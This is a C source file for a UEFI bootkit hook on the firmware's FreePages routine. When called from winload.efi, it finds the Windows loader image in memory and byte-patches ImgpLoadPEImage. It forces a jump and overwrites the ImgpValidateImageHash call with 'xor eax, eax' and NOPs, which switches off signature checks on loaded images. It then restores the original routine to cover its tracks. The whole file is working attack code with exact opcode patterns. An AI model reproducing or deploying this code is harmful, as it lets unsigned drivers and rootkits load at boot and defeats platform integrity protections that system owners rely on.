#include "FreePages.h"

/*!
 *
 * Purpose:
 *
 * Detects when being executed from the winload.efi module
 * and patches the signature verification in the
 * ImgpLoadPEImage routine.
 *
!*/
D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN UINTN Pages )
{
    PGENTBL                     Gen = NULL;
    PUINT8                      Adr = NULL;

    PIMAGE_DOS_HEADER           Dos = NULL;
    PIMAGE_NT_HEADERS           Nth = NULL;
    PIMAGE_DATA_DIRECTORY       Dir = NULL;
    PIMAGE_DEBUG_DIRECTORY      Dbg = NULL;
    PRSDS_DEBUG_FORMAT          Rsd = NULL;

    /* Resolve the general table structure */
    Gen = C_PTR( G_PTR( GenTbl ) );

    /* Retrieve RAX value and align it to the page boundary */
    Dos = C_PTR( U_PTR( RETURN_ADDRESS( 0 ) ) & ~ EFI_PAGE_MASK );

    do
    {
        /* Has the MZ magic? */
        if ( Dos->e_magic == IMAGE_DOS_SIGNATURE )
        {
            /* Get the NT headers */
            Nth = C_PTR( ( U_PTR( Dos ) + Dos->e_lfanew ) );

            /* Are the NT headers valid? */
            if ( Nth->Signature == IMAGE_NT_SIGNATURE )
            {
                /* Leave! */
                break;
            }
        }
        /* Step back to the previus page */
        Dos = C_PTR( U_PTR( Dos ) - EFI_PAGE_SIZE );
    } while ( TRUE );

    /* Get a pointer to the debug directory */
    Dir = C_PTR( & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_DEBUG ] );

    /* Is debug directory exist? */
    if ( Dir->VirtualAddress == 0 )
    {
        /* No? Leave! */
        goto LEAVE;
    }

    /* Calculate a debug directory pointer */
    Dbg = C_PTR( U_PTR( Dos ) + Dir->VirtualAddress );

    /* Is it a code view directory? */
    if ( Dbg->Type == IMAGE_DEBUG_TYPE_CODEVIEW )
    {
        /* Get a pointer to the debug store */
        Rsd = C_PTR( U_PTR( Dos ) + Dbg->AddressOfRawData );

        /* Is it rich symbol for sure? */
        if ( Rsd->Signature == PE_PDB_RSDS_SIGNATURE )
        {
            /* Is this winload.efi? */
            if ( Rsd->Path == WINLOAD_PATH_SIGNATURE )
            {
                /* Yes! - Set up the pointer to the base of the PE image */
                Adr = C_PTR( U_PTR( Dos ) );

                while ( U_PTR( Adr ) < U_PTR( Dos ) + Nth->OptionalHeader.SizeOfImage )
                {
                    /* jz short loc_180096FBF -> jmp short loc_180096FBF */
                    if ( Adr[ 0x00 ] == 0xC7 &&
                         Adr[ 0x01 ] == 0x74 &&
                         Adr[ 0x04 ] == 0x0F )
                    {
                        *( PUINT8 )( U_PTR( Adr + 0x01 ) ) = ( UINT8 )( 0xEB ); /* jmp */
                    }

                    /* call ImgpValidateImageHash -> xor eax, eax */
                    if ( Adr[ 0x00 ] == 0xD8 &&
                         Adr[ 0x01 ] == 0x3D &&
                         Adr[ 0x02 ] == 0x2D )
                    {
                        *( PUINT16 )( U_PTR( Adr - 0x06 ) ) = ( UINT16 )( 0xC031 ); /* xor eax, eax */
                        *( PUINT8 ) ( U_PTR( Adr - 0x04 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
                        *( PUINT8 ) ( U_PTR( Adr - 0x03 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
                        *( PUINT8 ) ( U_PTR( Adr - 0x02 ) ) = ( UINT8 ) ( 0x90 );   /* nop */

                        /* Restore the original routine */
                        Gen->SystemTable->BootServices->FreePages = C_PTR( Gen->FreePages );

                        /* Quit! */
                        goto LEAVE;
                    }

                    /* Move to next opcode */
                    Adr += 0x1;
                }
            }
        }
    }

LEAVE:
    /* Execute original routine */
    return ( ( D_API( FreePagesHook ) )( Gen->FreePages ) )( Memory, Pages );
} E_SEC;
